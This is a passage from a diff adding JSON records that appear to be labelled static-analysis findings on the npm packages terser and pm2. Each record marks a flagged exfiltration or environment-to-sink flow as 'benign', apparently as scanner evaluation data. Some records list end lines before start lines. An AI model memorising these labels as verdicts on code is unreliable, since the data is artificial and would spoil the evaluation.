+    "query": "os-fingerprinting-exfiltration",
+    "file": "lib/cli.js",
+    "startLine": 443,
+    "endLine": 443,
+    "message": "OS fingerprinting data exfiltration detected. Source: fs.read ... \"utf8\") \u2192 Sink: msg"
+  },
+  {
+    "package": "terser",
+    "version": "5.44.1",
+    "label": "benign",
+    "query": "os-fingerprinting-exfiltration",
+    "file": "lib/parse.js",
+    "startLine": 2511,
+    "endLine": 2511,
+    "message": "OS fingerprinting data exfiltration detected. Source: fs.read ... \"utf8\") \u2192 Sink: S.token"
+  },
+  {
+    "package": "terser",
+    "version": "5.44.1",
+    "label": "benign",
+    "query": "os-fingerprinting-exfiltration",
+    "file": "lib/parse.js",
+    "startLine": 2523,
+    "endLine": 2523,
+    "message": "OS fingerprinting data exfiltration detected. Source: fs.read ... \"utf8\") \u2192 Sink: S.token"
+  },
+  {
+    "package": "terser",
+    "version": "5.44.1",
+    "label": "benign",
+    "query": "os-fingerprinting-exfiltration",
+    "file": "lib/parse.js",
+    "startLine": 3196,
+    "endLine": 3196,
+    "message": "OS fingerprinting data exfiltration detected. Source: fs.read ... \"utf8\") \u2192 Sink: before_token"
+  },
+  {
+    "package": "terser",
+    "version": "5.44.0",
+    "label": "benign",
+    "query": "os-fingerprinting-exfiltration",
+    "file": "lib/cli.js",
+    "startLine": 443,
+    "endLine": 443,
+    "message": "OS fingerprinting data exfiltration detected. Source: fs.read ... \"utf8\") \u2192 Sink: msg"
+  },
+  {
+    "package": "terser",
+    "version": "5.44.0",
+    "label": "benign",
+    "query": "os-fingerprinting-exfiltration",
+    "file": "lib/parse.js",
+    "startLine": 2511,
+    "endLine": 2511,
+    "message": "OS fingerprinting data exfiltration detected. Source: fs.read ... \"utf8\") \u2192 Sink: S.token"
+  },
+  {
+    "package": "terser",
+    "version": "5.44.0",
+    "label": "benign",
+    "query": "os-fingerprinting-exfiltration",
+    "file": "lib/parse.js",
+    "startLine": 2523,
+    "endLine": 2523,
+    "message": "OS fingerprinting data exfiltration detected. Source: fs.read ... \"utf8\") \u2192 Sink: S.token"
+  },
+  {
+    "package": "terser",
+    "version": "5.44.0",
+    "label": "benign",
+    "query": "os-fingerprinting-exfiltration",
+    "file": "lib/parse.js",
+    "startLine": 3196,
+    "endLine": 3196,
+    "message": "OS fingerprinting data exfiltration detected. Source: fs.read ... \"utf8\") \u2192 Sink: before_token"
+  },
+  {
+    "package": "pm2",
+    "version": "6.0.14",
+    "label": "benign",
+    "query": "pre-post-source-sink-execution",
+    "file": "lib/API/pm2-plus/PM2IO.js",
+    "startLine": 368,
+    "endLine": 370,
+    "message": "Source path process.env flows into sensitive operation"
+  },
+  {
+    "package": "pm2",
+    "version": "6.0.14",
+    "label": "benign",
+    "query": "pre-post-source-sink-execution",
+    "file": "lib/API/pm2-plus/auth-strategies/WebAuth.js",
+    "startLine": 183,
+    "endLine": 185,
+    "message": "Source path process.env flows into sensitive operation"
+  },
+  {
+    "package": "pm2",
+    "version": "6.0.14",
+    "label": "benign",
+    "query": "pre-post-source-sink-execution",
+    "file": "lib/Common.js",
+    "startLine": 15,
+    "endLine": 319,
+    "message": "Source path process.env flows into sensitive operation"
+  },
+  {
+    "package": "pm2",
+    "version": "6.0.14",
+    "label": "benign",
+    "query": "pre-post-source-sink-execution",
+    "file": "lib/Common.js",
+    "startLine": 17,
+    "endLine": 319,
+    "message": "Source path process.env flows into sensitive operation"
+  },
+  {
+    "package": "pm2",
+    "version": "6.0.14",
+    "label": "benign",
+    "query": "pre-post-source-sink-execution",
+    "file": "lib/Common.js",
+    "startLine": 19,
+    "endLine": 319,
+    "message": "Source path process.env flows into sensitive operation"
+  },
+  {
+    "package": "pm2",
+    "version": "6.0.14",
+    "label": "benign",
+    "query": "pre-post-source-sink-execution",
+    "file": "lib/Common.js",
+    "startLine": 78,
+    "endLine": 319,
+    "message": "Source path process.env flows into sensitive operation"
+  },
+  {
+    "package": "pm2",
+    "version": "6.0.14",
+    "label": "benign",
+    "query": "pre-post-source-sink-execution",
+    "file": "lib/Common.js",
+    "startLine": 78,
+    "endLine": 418,
+    "message": "Source path process.env flows into sensitive operation"
+  },
+  {
+    "package": "pm2",
+    "version": "6.0.14",
+    "label": "benign",
+    "query": "pre-post-source-sink-execution",
+    "file": "lib/Common.js",
+    "startLine": 390,
+    "endLine": 418,
+    "message": "Source path process.env flows into sensitive operation"
+  },
+  {
+    "package": "pm2",
+    "version": "6.0.14",
+    "label": "benign",
+    "query": "pre-post-source-sink-execution",
+    "file": "lib/ProcessContainer.js",
+    "startLine": 19,
+    "endLine": 103,
+    "message": "Source path process.env flows into sensitive operation"
+  },
+  {
+    "package": "pm2",
+    "version": "6.0.14",
+    "label": "benign",
+    "query": "pre-post-source-sink-execution",
+    "file": "lib/ProcessContainerBun.js",
+    "startLine": 14,
+    "endLine": 96,
+    "message": "Source path process.env flows into sensitive operation"
+  },
+  {
+    "package": "pm2",
+    "version": "6.0.14",
+    "label": "benign",
+    "query": "pre-post-source-sink-execution",
+    "file": "lib/tools/open.js",
+    "startLine": 56,
+    "endLine": 58,
+    "message": "Source path process.env flows into sensitive operation"
+  },
+  {
+    "package": "pm2",
+    "version": "6.0.14",
+    "label": "benign",
+    "query": "pre-post-source-sink-execution",
+    "file": "lib/tools/sexec.js",
+    "startLine": 15,
+    "endLine": 35,
+    "message": "Source path process.env flows into sensitive operation"
+  },
+  {
+    "package": "pm2",
+    "version": "6.0.14",
+    "label": "benign",
+    "query": "pre-post-source-sink-execution",
+    "file": "lib/tools/sexec.js",
+    "startLine": 17,
+    "endLine": 35,
+    "message": "Source path process.env flows into sensitive operation"
+  },
+  {
+    "package": "pm2",
+    "version": "6.0.14",
+    "label": "benign",
+    "query": "pre-post-source-sink-execution",
+    "file": "lib/tools/sexec.js",
+    "startLine": 19,
+    "endLine": 35,
+    "message": "Source path process.env flows into sensitive operation"
+  },
+  {
+    "package": "pm2",
+    "version": "6.0.14",
+    "label": "benign",
+    "query": "pre-post-source-sink-execution",
+    "file": "lib/tools/sexec.js",
+    "startLine": 33,
+    "endLine": 35,
+    "message": "Source path process.env flows into sensitive operation"
+  },
+  {
+    "package": "pm2",
+    "version": "6.0.14",
+    "label": "benign",
+    "query": "pre-post-source-sink-execution",
+    "file": "lib/tools/sexec.js",
+    "startLine": 35,
+    "endLine": 35,
+    "message": "Source path process.env flows into sensitive operation"
+  },
+  {
+    "package": "pm2",
+    "version": "6.0.14",
+    "label": "benign",
+    "query": "pre-post-source-sink-execution",
+    "file": "lib/tools/sexec.js",
+    "startLine": 68,
+    "endLine": 35,
+    "message": "Source path process.env flows into sensitive operation"
+  },
+  {
+    "package": "pm2",
+    "version": "6.0.14",
+    "label": "benign",
+    "query": "pre-post-source-sink-execution",
+    "file": "lib/tools/sexec.js",
+    "startLine": 75,
+    "endLine": 35,
+    "message": "Source path process.env flows into sensitive operation"
+  },
+  {
+    "package": "pm2",
+    "version": "6.0.14",
+    "label": "benign",
+    "query": "pre-post-source-sink-execution",
+    "file": "lib/tools/sexec.js",
+    "startLine": 78,
+    "endLine": 35,
+    "message": "Source path process.env flows into sensitive operation"
+  },
+  {
+    "package": "pm2",
+    "version": "6.0.14",
+    "label": "benign",
+    "query": "pre-post-source-sink-execution",
+    "file": "lib/tools/sexec.js",
+    "startLine": 146,
+    "endLine": 35,
+    "message": "Source path process.env flows into sensitive operation"
+  },
+  {
+    "package": "pm2",
+    "version": "6.0.14",
+    "label": "benign",
+    "query": "os-fingerprinting-exfiltration",
+    "file": "lib/API/Modules/TAR.js",
+    "startLine": 341,
+    "endLine": 341,
+    "message": "OS fingerprinting data exfiltration detected. Source: fs.read ... json')) \u2192 Sink: data"
+  },
+  {
+    "package": "pm2",
+    "version": "6.0.14",
+    "label": "benign",
+    "query": "os-fingerprinting-exfiltration",
+    "file": "lib/HttpInterface.js",
+    "startLine": 61,
+    "endLine": 61,
+    "message": "OS fingerprinting data exfiltration detected. Source: os.netw ... faces() \u2192 Sink: JSON.stringify(data)"
+  },
+  {
+    "package": "pm2",
+    "version": "6.0.14",
+    "label": "benign",
+    "query": "os-fingerprinting-exfiltration",
+    "file": "lib/ProcessContainer.js",
+    "startLine": 182,
+    "endLine": 186,
+    "message": "OS fingerprinting data exfiltration detected. Source: process.env \u2192 Sink: {\\n      ...       }"
+  },
+  {
+    "package": "pm2",
+    "version": "6.0.14",
+    "label": "benign",
+    "query": "os-fingerprinting-exfiltration",
+    "file": "lib/ProcessContainer.js",
+    "startLine": 192,
+    "endLine": 192,
+    "message": "OS fingerprinting data exfiltration detected. Source: process.env \u2192 Sink: log_data"
+  },
+  {
+    "package": "pm2",
+    "version": "6.0.14",
+    "label": "benign",
+    "query": "os-fingerprinting-exfiltration",
+    "file": "lib/ProcessContainer.js",
+    "startLine": 193,
+    "endLine": 193,
+    "message": "OS fingerprinting data exfiltration detected. Source: process.env \u2192 Sink: log_data"
+  },
+  {
+    "package": "pm2",
+    "version": "6.0.14",
+    "label": "benign",
+    "query": "os-fingerprinting-exfiltration",
+    "file": "lib/ProcessContainer.js",
+    "startLine": 221,
+    "endLine": 224,
+    "message": "OS fingerprinting data exfiltration detected. Source: process.env \u2192 Sink: {\\n      ...       }"
+  },
+  {
+    "package": "pm2",
+    "version": "6.0.14",
+    "label": "benign",
+    "query": "os-fingerprinting-exfiltration",
+    "file": "lib/ProcessContainer.js",
+    "startLine": 230,
+    "endLine": 230,
+    "message": "OS fingerprinting data exfiltration detected. Source: process.env \u2192 Sink: log_data"
+  },
+  {
+    "package": "pm2",
+    "version": "6.0.14",
+    "label": "benign",
+    "query": "os-fingerprinting-exfiltration",
+    "file": "lib/ProcessContainer.js",
+    "startLine": 231,
+    "endLine": 231,
+    "message": "OS fingerprinting data exfiltration detected. Source: process.env \u2192 Sink: log_data"
+  },
+  {
+    "package": "pm2",
+    "version": "6.0.14",
+    "label": "benign",
+    "query": "os-fingerprinting-exfiltration",
+    "file": "lib/ProcessContainerBun.js",
+    "startLine": 173,
+    "endLine": 176,
+    "message": "OS fingerprinting data exfiltration detected. Source: process.env \u2192 Sink: {\\n      ...       }"
+  },
+  {
+    "package": "pm2",
+    "version": "6.0.14",
+    "label": "benign",
+    "query": "os-fingerprinting-exfiltration",
+    "file": "lib/ProcessContainerBun.js",
+    "startLine": 178,
+    "endLine": 178,
+    "message": "OS fingerprinting data exfiltration detected. Source: process.env \u2192 Sink: log_data"
+  },
+  {
+    "package": "pm2",
+    "version": "6.0.14",
+    "label": "benign",
+    "query": "os-fingerprinting-exfiltration",
+    "file": "lib/ProcessContainerBun.js",
+    "startLine": 179,
+    "endLine": 179,
+    "message": "OS fingerprinting data exfiltration detected. Source: process.env \u2192 Sink: log_data"
+  },
+  {
+    "package": "pm2",
+    "version": "6.0.14",
+    "label": "benign",
+    "query": "os-fingerprinting-exfiltration",
+    "file": "lib/ProcessContainerBun.js",
+    "startLine": 211,
+    "endLine": 214,
+    "message": "OS fingerprinting data exfiltration detected. Source: process.env \u2192 Sink: {\\n      ...       }"
+  },
+  {
+    "package": "pm2",
+    "version": "6.0.14",
+    "label": "benign",
+    "query": "os-fingerprinting-exfiltration",
+    "file": "lib/ProcessContainerBun.js",
+    "startLine": 216,
+    "endLine": 216,
+    "message": "OS fingerprinting data exfiltration detected. Source: process.env \u2192 Sink: log_data"
+  },
+  {
+    "package": "pm2",
+    "version": "6.0.14",
+    "label": "benign",
+    "query": "os-fingerprinting-exfiltration",
+    "file": "lib/ProcessContainerBun.js",
+    "startLine": 217,
+    "endLine": 217,
+    "message": "OS fingerprinting data exfiltration detected. Source: process.env \u2192 Sink: log_data"
+  },
+  {
+    "package": "pm2",
+    "version": "6.0.14",
+    "label": "benign",
+    "query": "os-fingerprinting-exfiltration",
+    "file": "lib/ProcessContainerBun.js",
+    "startLine": 245,
+    "endLine": 249,
+    "message": "OS fingerprinting data exfiltration detected. Source: process.env \u2192 Sink: {\\n      ...       }"
+  },
+  {
+    "package": "pm2",
+    "version": "6.0.14",
+    "label": "benign",
+    "query": "os-fingerprinting-exfiltration",
+    "file": "lib/ProcessContainerBun.js",
+    "startLine": 255,
+    "endLine": 255,
+    "message": "OS fingerprinting data exfiltration detected. Source: process.env \u2192 Sink: log_data"
+  },
+  {
+    "package": "pm2",
+    "version": "6.0.14",
+    "label": "benign",
+    "query": "os-fingerprinting-exfiltration",
+    "file": "lib/ProcessContainerBun.js",
+    "startLine": 256,
+    "endLine": 256,
+    "message": "OS fingerprinting data exfiltration detected. Source: process.env \u2192 Sink: log_data"
+  },
+  {
+    "package": "pm2",
+    "version": "6.0.14",
+    "label": "benign",
+    "query": "os-fingerprinting-exfiltration",
+    "file": "lib/ProcessContainerBun.js",
+    "startLine": 284,
+    "endLine": 287,
+    "message": "OS fingerprinting data exfiltration detected. Source: process.env \u2192 Sink: {\\n      ...       }"
+  },
+  {
+    "package": "pm2",
+    "version": "6.0.14",
+    "label": "benign",
+    "query": "os-fingerprinting-exfiltration",
+    "file": "lib/ProcessContainerBun.js",
+    "startLine": 293,
+    "endLine": 293,
+    "message": "OS fingerprinting data exfiltration detected. Source: process.env \u2192 Sink: log_data"
+  },
+  {
+    "package": "pm2",
+    "version": "6.0.14",
+    "label": "benign",
+    "query": "os-fingerprinting-exfiltration",
+    "file": "lib/ProcessContainerBun.js",
+    "startLine": 294,
+    "endLine": 294,
+    "message": "OS fingerprinting data exfiltration detected. Source: process.env \u2192 Sink: log_data"
+  },
+  {
+    "package": "pm2",
+    "version": "6.0.13",
+    "label": "benign",
+    "query": "pre-post-source-sink-execution",
+    "file": "lib/API/pm2-plus/PM2IO.js",
+    "startLine": 368,
+    "endLine": 370,
+    "message": "Source path process.env flows into sensitive operation"
+  },
+  {
+    "package": "pm2",
+    "version": "6.0.13",
+    "label": "benign",
+    "query": "pre-post-source-sink-execution",
+    "file": "lib/API/pm2-plus/auth-strategies/WebAuth.js",
+    "startLine": 183,
+    "endLine": 185,
+    "message": "Source path process.env flows into sensitive operation"
+  },
+  {
+    "package": "pm2",
+    "version": "6.0.13",
+    "label": "benign",
+    "query": "pre-post-source-sink-execution",
+    "file": "lib/Common.js",
+    "startLine": 15,
+    "endLine": 319,
+    "message": "Source path process.env flows into sensitive operation"
+  },
+  {
+    "package": "pm2",
+    "version": "6.0.13",
+    "label": "benign",
+    "query": "pre-post-source-sink-execution",
+    "file": "lib/Common.js",
+    "startLine": 17,
+    "endLine": 319,
+    "message": "Source path process.env flows into sensitive operation"
+  },
+  {
+    "package": "pm2",
+    "version": "6.0.13",
+    "label": "benign",
+    "query": "pre-post-source-sink-execution",
+    "file": "lib/Common.js",
+    "startLine": 19,
+    "endLine": 319,
+    "message": "Source path process.env flows into sensitive operation"
+  },
+  {
+    "package": "pm2",
+    "version": "6.0.13",
+    "label": "benign",
+    "query": "pre-post-source-sink-execution",
+    "file": "lib/Common.js",
+    "startLine": 78,
+    "endLine": 319,
+    "message": "Source path process.env flows into sensitive operation"
+  },
+  {
+    "package": "pm2",
+    "version": "6.0.13",
+    "label": "benign",
+    "query": "pre-post-source-sink-execution",
+    "file": "lib/Common.js",
+    "startLine": 78,
+    "endLine": 418,
+    "message": "Source path process.env flows into sensitive operation"
+  },
+  {
+    "package": "pm2",
+    "version": "6.0.13",
+    "label": "benign",
+    "query": "pre-post-source-sink-execution",
+    "file": "lib/Common.js",
+    "startLine": 390,
+    "endLine": 418,
+    "message": "Source path process.env flows into sensitive operation"
+  },
+  {
+    "package": "pm2",
+    "version": "6.0.13",
+    "label": "benign",
+    "query": "pre-post-source-sink-execution",
+    "file": "lib/ProcessContainer.js",
+    "startLine": 19,
+    "endLine": 103,
+    "message": "Source path process.env flows into sensitive operation"
+  },
+  {
+    "package": "pm2",
+    "version": "6.0.13",
+    "label": "benign",
+    "query": "pre-post-source-sink-execution",
+    "file": "lib/ProcessContainerBun.js",
+    "startLine": 14,
+    "endLine": 96,
+    "message": "Source path process.env flows into sensitive operation"
+  },
+  {
+    "package": "pm2",
+    "version": "6.0.13",
+    "label": "benign",
+    "query": "pre-post-source-sink-execution",
+    "file": "lib/tools/open.js",
+    "startLine": 56,
+    "endLine": 58,
+    "message": "Source path process.env flows into sensitive operation"
+  },
+  {
+    "package": "pm2",
+    "version": "6.0.13",
+    "label": "benign",
+    "query": "pre-post-source-sink-execution",
+    "file": "lib/tools/sexec.js",
+    "startLine": 15,
+    "endLine": 35,
+    "message": "Source path process.env flows into sensitive operation"
+  },
+  {
+    "package": "pm2",
+    "version": "6.0.13",
+    "label": "benign",
+    "query": "pre-post-source-sink-execution",
+    "file": "lib/tools/sexec.js",
+    "startLine": 17,
+    "endLine": 35,
+    "message": "Source path process.env flows into sensitive operation"
+  },
+  {
+    "package": "pm2",
+    "version": "6.0.13",
+    "label": "benign",
+    "query": "pre-post-source-sink-execution",
+    "file": "lib/tools/sexec.js",
+    "startLine": 19,
+    "endLine": 35,
+    "message": "Source path process.env flows into sensitive operation"
+  },
+  {
+    "package": "pm2",
+    "version": "6.0.13",
+    "label": "benign",
+    "query": "pre-post-source-sink-execution",
+    "file": "lib/tools/sexec.js",
+    "startLine": 33,
+    "endLine": 35,
+    "message": "Source path process.env flows into sensitive operation"
+  },
+  {
+    "package": "pm2",
+    "version": "6.0.13",
+    "label": "benign",
+    "query": "pre-post-source-sink-execution",
+    "file": "lib/tools/sexec.js",
+    "startLine": 35,
+    "endLine": 35,
+    "message": "Source path process.env flows into sensitive operation"
+  },
+  {
+    "package": "pm2",
+    "version": "6.0.13",
+    "label": "benign",
+    "query": "pre-post-source-sink-execution",
+    "file": "lib/tools/sexec.js",
+    "startLine": 68,
+    "endLine": 35,
+    "message": "Source path process.env flows into sensitive operation"
+  },
+  {
+    "package": "pm2",
+    "version": "6.0.13",
+    "label": "benign",
+    "query": "pre-post-source-sink-execution",
+    "file": "lib/tools/sexec.js",
+    "startLine": 75,
+    "endLine": 35,
+    "message": "Source path process.env flows into sensitive operation"
+  },
+  {
+    "package": "pm2",
+    "version": "6.0.13",
+    "label": "benign",
+    "query": "pre-post-source-sink-execution",
+    "file": "lib/tools/sexec.js",
+    "startLine": 78,
+    "endLine": 35,
+    "message": "Source path process.env flows into sensitive operation"
+  },
+  {
+    "package": "pm2",
+    "version": "6.0.13",
+    "label": "benign",
+    "query": "pre-post-source-sink-execution",
+    "file": "lib/tools/sexec.js",
+    "startLine": 146,
+    "endLine": 35,
+    "message": "Source path process.env flows into sensitive operation"
+  },
+  {
+    "package": "pm2",
+    "version": "6.0.13",
+    "label": "benign",
+    "query": "os-fingerprinting-exfiltration",
+    "file": "lib/API/Modules/TAR.js",
+    "startLine": 341,
+    "endLine": 341,
+    "message": "OS fingerprinting data exfiltration detected. Source: fs.read ... json')) \u2192 Sink: data"
+  },
+  {
+    "package": "pm2",
+    "version": "6.0.13",
+    "label": "benign",
+    "query": "os-fingerprinting-exfiltration",
+    "file": "lib/HttpInterface.js",
+    "startLine": 61,
+    "endLine": 61,
+    "message": "OS fingerprinting data exfiltration detected. Source: os.netw ... faces() \u2192 Sink: JSON.stringify(data)"
+  },
+  {
+    "package": "pm2",
+    "version": "6.0.13",
+    "label": "benign",
+    "query": "os-fingerprinting-exfiltration",
+    "file": "lib/ProcessContainer.js",
+    "startLine": 182,
+    "endLine": 186,
+    "message": "OS fingerprinting data exfiltration detected. Source: process.env \u2192 Sink: {\\n      ...       }"
+  },
+  {
+    "package": "pm2",
+    "version": "6.0.13",
+    "label": "benign",
+    "query": "os-fingerprinting-exfiltration",
+    "file": "lib/ProcessContainer.js",
+    "startLine": 192,
+    "endLine": 192,
+    "message": "OS fingerprinting data exfiltration detected. Source: process.env \u2192 Sink: log_data"
+  },
+  {
+    "package": "pm2",
+    "version": "6.0.13",
+    "label": "benign",
+    "query": "os-fingerprinting-exfiltration",
+    "file": "lib/ProcessContainer.js",
+    "startLine": 193,
+    "endLine": 193,
+    "message": "OS fingerprinting data exfiltration detected. Source: process.env \u2192 Sink: log_data"
+  },
+  {
+    "package": "pm2",
+    "version": "6.0.13",
+    "label": "benign",
+    "query": "os-fingerprinting-exfiltration",
+    "file": "lib/ProcessContainer.js",
+    "startLine": 221,
+    "endLine": 224,
+    "message": "OS fingerprinting data exfiltration detected. Source: process.env \u2192 Sink: {\\n      ...       }"
+  },
+  {
+    "package": "pm2",
+    "version": "6.0.13",
+    "label": "benign",
+    "query": "os-fingerprinting-exfiltration",
+    "file": "lib/ProcessContainer.js",
+    "startLine": 230,
+    "endLine": 230,
+    "message": "OS fingerprinting data exfiltration detected. Source: process.env \u2192 Sink: log_data"
+  },
+  {
+    "package": "pm2",
+    "version": "6.0.13",
+    "label": "benign",
+    "query": "os-fingerprinting-exfiltration",
+    "file": "lib/ProcessContainer.js",
+    "startLine": 231,
+    "endLine": 231,
+    "message": "OS fingerprinting data exfiltration detected. Source: process.env \u2192 Sink: log_data"
+  },
+  {
+    "package": "pm2",
+    "version": "6.0.13",
+    "label": "benign",
+    "query": "os-fingerprinting-exfiltration",
+    "file": "lib/ProcessContainerBun.js",
+    "startLine": 173,
+    "endLine": 176,
+    "message": "OS fingerprinting data exfiltration detected. Source: process.env \u2192 Sink: {\\n      ...       }"
+  },
+  {
+    "package": "pm2",
+    "version": "6.0.13",
+    "label": "benign",
+    "query": "os-fingerprinting-exfiltration",
+    "file": "lib/ProcessContainerBun.js",
+    "startLine": 178,
+    "endLine": 178,
+    "message": "OS fingerprinting data exfiltration detected. Source: process.env \u2192 Sink: log_data"
+  },
+  {
+    "package": "pm2",
+    "version": "6.0.13",
+    "label": "benign",
+    "query": "os-fingerprinting-exfiltration",
+    "file": "lib/ProcessContainerBun.js",
+    "startLine": 179,
+    "endLine": 179,
+    "message": "OS fingerprinting data exfiltration detected. Source: process.env \u2192 Sink: log_data"
+  },
+  {
+    "package": "pm2",
+    "version": "6.0.13",
+    "label": "benign",
+    "query": "os-fingerprinting-exfiltration",
+    "file": "lib/ProcessContainerBun.js",
+    "startLine": 211,
+    "endLine": 214,
+    "message": "OS fingerprinting data exfiltration detected. Source: process.env \u2192 Sink: {\\n      ...       }"
+  },
+  {
+    "package": "pm2",
+    "version": "6.0.13",
+    "label": "benign",
+    "query": "os-fingerprinting-exfiltration",
+    "file": "lib/ProcessContainerBun.js",
+    "startLine": 216,
+    "endLine": 216,
+    "message": "OS fingerprinting data exfiltration detected. Source: process.env \u2192 Sink: log_data"
+  },
+  {
+    "package": "pm2",
+    "version": "6.0.13",
+    "label": "benign",
+    "query": "os-fingerprinting-exfiltration",
+    "file": "lib/ProcessContainerBun.js",
+    "startLine": 217,
+    "endLine": 217,
+    "message": "OS fingerprinting data exfiltration detected. Source: process.env \u2192 Sink: log_data"
+  },
+  {
+    "package": "pm2",
+    "version": "6.0.13",
+    "label": "benign",
+    "query": "os-fingerprinting-exfiltration",
+    "file": "lib/ProcessContainerBun.js",
+    "startLine": 245,
+    "endLine": 249,
+    "message": "OS fingerprinting data exfiltration detected. Source: process.env \u2192 Sink: {\\n      ...       }"
+  },
+  {
+    "package": "pm2",
+    "version": "6.0.13",
+    "label": "benign",
+    "query": "os-fingerprinting-exfiltration",
+    "file": "lib/ProcessContainerBun.js",
+    "startLine": 255,
+    "endLine": 255,
+    "message": "OS fingerprinting data exfiltration detected. Source: process.env \u2192 Sink: log_data"
+  },
+  {
+    "package": "pm2",
+    "version": "6.0.13",
+    "label": "benign",
+    "query": "os-fingerprinting-exfiltration",
+    "file": "lib/ProcessContainerBun.js",
+    "startLine": 256,
+    "endLine": 256,
+    "message": "OS fingerprinting data exfiltration detected. Source: process.env \u2192 Sink: log_data"
+  },
+  {
+    "package": "pm2",
+    "version": "6.0.13",
+    "label": "benign",
+    "query": "os-fingerprinting-exfiltration",
+    "file": "lib/ProcessContainerBun.js",
+    "startLine": 284,
+    "endLine": 287,
+    "message": "OS fingerprinting data exfiltration detected. Source: process.env \u2192 Sink: {\\n      ...       }"
+  },
+  {
+    "package": "pm2",
+    "version": "6.0.13",
+    "label": "benign",
+    "query": "os-fingerprinting-exfiltration",
+    "file": "lib/ProcessContainerBun.js",
+    "startLine": 293,
+    "endLine": 293,
+    "message": "OS fingerprinting data exfiltration detected. Source: process.env \u2192 Sink: log_data"
+  },
+  {
+    "package": "pm2",
+    "version": "6.0.13",
+    "label": "benign",
+    "query": "os-fingerprinting-exfiltration",
+    "file": "lib/ProcessContainerBun.js",
+    "startLine": 294,
+    "endLine": 294,
+    "message": "OS fingerprinting data exfiltration detected. Source: process.env \u2192 Sink: log_data"
+  },
+  {
+    "package": "pm2",
+    "version": "6.0.12",
+    "label": "benign",
+    "query": "pre-post-source-sink-execution",
+    "file": "lib/API/pm2-plus/PM2IO.js",
+    "startLine": 368,
+    "endLine": 370,
+    "message": "Source path process.env flows into sensitive operation"
+  },
+  {
+    "package": "pm2",
+    "version": "6.0.12",
+    "label": "benign",
+    "query": "pre-post-source-sink-execution",
+    "file": "lib/API/pm2-plus/auth-strategies/WebAuth.js",
+    "startLine": 183,
+    "endLine": 185,
+    "message": "Source path process.env flows into sensitive operation"
+  },
+  {
+    "package": "pm2",
+    "version": "6.0.12",
+    "label": "benign",
+    "query": "pre-post-source-sink-execution",
+    "file": "lib/Common.js",
+    "startLine": 15,
+    "endLine": 319,
+    "message": "Source path process.env flows into sensitive operation"
+  },
+  {
+    "package": "pm2",
+    "version": "6.0.12",
+    "label": "benign",
+    "query": "pre-post-source-sink-execution",
+    "file": "lib/Common.js",
+    "startLine": 17,
+    "endLine": 319,
+    "message": "Source path process.env flows into sensitive operation"
+  },
+  {
+    "package": "pm2",
+    "version": "6.0.12",
+    "label": "benign",
+    "query": "pre-post-source-sink-execution",
+    "file": "lib/Common.js",
+    "startLine": 19,
+    "endLine": 319,
+    "message": "Source path process.env flows into sensitive operation"
+  },
+  {
+    "package": "pm2",
+    "version": "6.0.12",
+    "label": "benign",
+    "query": "pre-post-source-sink-execution",
+    "file": "lib/Common.js",
+    "startLine": 78,
+    "endLine": 319,
+    "message": "Source path process.env flows into sensitive operation"
+  },
+  {
+    "package": "pm2",
+    "version": "6.0.12",
+    "label": "benign",
+    "query": "pre-post-source-sink-execution",
+    "file": "lib/Common.js",
+    "startLine": 78,
+    "endLine": 418,
+    "message": "Source path process.env flows into sensitive operation"
+  },
+  {
+    "package": "pm2",
+    "version": "6.0.12",
+    "label": "benign",
+    "query": "pre-post-source-sink-execution",
+    "file": "lib/Common.js",
+    "startLine": 390,
+    "endLine": 418,
+    "message": "Source path process.env flows into sensitive operation"
+  },
+  {
+    "package": "pm2",
+    "version": "6.0.12",
+    "label": "benign",
+    "query": "pre-post-source-sink-execution",
+    "file": "lib/ProcessContainer.js",
+    "startLine": 19,
+    "endLine": 103,
+    "message": "Source path process.env flows into sensitive operation"
+  },
+  {
+    "package": "pm2",
+    "version": "6.0.12",
+    "label": "benign",
+    "query": "pre-post-source-sink-execution",
+    "file": "lib/ProcessContainerBun.js",
+    "startLine": 14,
+    "endLine": 96,
+    "message": "Source path process.env flows into sensitive operation"
+  },
+  {
+    "package": "pm2",
+    "version": "6.0.12",
+    "label": "benign",
+    "query": "pre-post-source-sink-execution",
+    "file": "lib/tools/open.js",
+    "startLine": 56,
+    "endLine": 58,
+    "message": "Source path process.env flows into sensitive operation"
+  },
+  {
+    "package": "pm2",
+    "version": "6.0.12",
+    "label": "benign",
+    "query": "pre-post-source-sink-execution",
+    "file": "lib/tools/sexec.js",
+    "startLine": 15,
+    "endLine": 35,
+    "message": "Source path process.env flows into sensitive operation"
+  },
+  {
+    "package": "pm2",
+    "version": "6.0.12",
+    "label": "benign",
+    "query": "pre-post-source-sink-execution",
+    "file": "lib/tools/sexec.js",
+    "startLine": 17,
+    "endLine": 35,
+    "message": "Source path process.env flows into sensitive operation"
+  },
+  {
+    "package": "pm2",
+    "version": "6.0.12",
+    "label": "benign",
+    "query": "pre-post-source-sink-execution",
+    "file": "lib/tools/sexec.js",
+    "startLine": 19,
+    "endLine": 35,
+    "message": "Source path process.env flows into sensitive operation"
+  },
+  {
+    "package": "pm2",
+    "version": "6.0.12",
+    "label": "benign",
+    "query": "pre-post-source-sink-execution",
+    "file": "lib/tools/sexec.js",
+    "startLine": 33,
+    "endLine": 35,
+    "message": "Source path process.env flows into sensitive operation"
+  },
+  {
+    "package": "pm2",
+    "version": "6.0.12",
+    "label": "benign",
+    "query": "pre-post-source-sink-execution",
+    "file": "lib/tools/sexec.js",
+    "startLine": 35,
+    "endLine": 35,
+    "message": "Source path process.env flows into sensitive operation"
+  },
+  {
+    "package": "pm2",
+    "version": "6.0.12",
+    "label": "benign",
+    "query": "pre-post-source-sink-execution",
+    "file": "lib/tools/sexec.js",
+    "startLine": 68,
+    "endLine": 35,
+    "message": "Source path process.env flows into sensitive operation"
+  },
+  {
+    "package": "pm2",
+    "version": "6.0.12",
+    "label": "benign",
+    "query": "pre-post-source-sink-execution",
+    "file": "lib/tools/sexec.js",
+    "startLine": 75,
+    "endLine": 35,
+    "message": "Source path process.env flows into sensitive operation"
+  },
+  {
+    "package": "pm2",
+    "version": "6.0.12",
+    "label": "benign",
+    "query": "pre-post-source-sink-execution",
+    "file": "lib/tools/sexec.js",
+    "startLine": 78,
+    "endLine": 35,
+    "message": "Source path process.env flows into sensitive operation"
+  },
+  {
+    "package": "pm2",
+    "version": "6.0.12",
+    "label": "benign",
+    "query": "pre-post-source-sink-execution",
+    "file": "lib/tools/sexec.js",
+    "startLine": 146,
+    "endLine": 35,
+    "message": "Source path process.env flows into sensitive operation"
+  },
+  {
+    "package": "pm2",
+    "version": "6.0.12",
+    "label": "benign",
+    "query": "os-fingerprinting-exfiltration",
+    "file": "lib/API/Modules/TAR.js",
+    "startLine": 341,
+    "endLine": 341,
